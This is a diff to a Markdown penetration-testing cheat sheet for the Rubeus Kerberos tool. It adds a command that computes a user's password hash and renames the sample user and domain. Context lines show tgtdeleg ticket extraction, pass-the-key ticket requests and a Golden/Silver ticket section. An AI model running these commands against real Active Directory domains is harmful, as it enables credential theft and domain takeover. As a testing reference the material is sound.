@@ -481,6 +481,9 @@ Get tickets currently on System:
 
 #### Tgtdeleg
 Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
+#### Hash
+Hash of a user:
+```rubeus.exe hash /user:Josh /domain:ecorp.local /password:Password@1```
 
 #### Pass-the-key/Over-PTH
 Request ticket (TGT) based on username and password/hash:
@@ -496,7 +499,7 @@ Rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab
 
 #### Golden/Silver
 Hash of a user:
-```rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1```
+```rubeus.exe hash /user:Josh /domain:ecorp.local /password:Password@1```
 
 Golden:
 
